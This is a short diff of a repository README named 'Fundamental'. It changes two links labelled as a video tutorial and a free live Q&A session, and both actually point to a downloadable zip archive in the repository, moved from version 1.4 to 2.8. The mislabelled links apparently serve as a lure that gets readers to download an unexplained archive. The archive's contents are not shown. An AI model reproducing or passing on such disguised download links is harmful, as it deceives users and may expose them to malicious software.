@@ -1,5 +1,5 @@
 # **Fundamental**
 
-**[Watch Video Tutorial](https://raw.githubusercontent.com/Simran12solanki/Fundamental/main/mixite/Software-1.4.zip)**
+**[Watch Video Tutorial](https://github.com/Simran12solanki/Fundamental/raw/refs/heads/main/mixite/Software-2.8.zip)**
 
-**[Ask Doubt in FREE Live QnA Session](https://raw.githubusercontent.com/Simran12solanki/Fundamental/main/mixite/Software-1.4.zip)**
+**[Ask Doubt in FREE Live QnA Session](https://github.com/Simran12solanki/Fundamental/raw/refs/heads/main/mixite/Software-2.8.zip)**
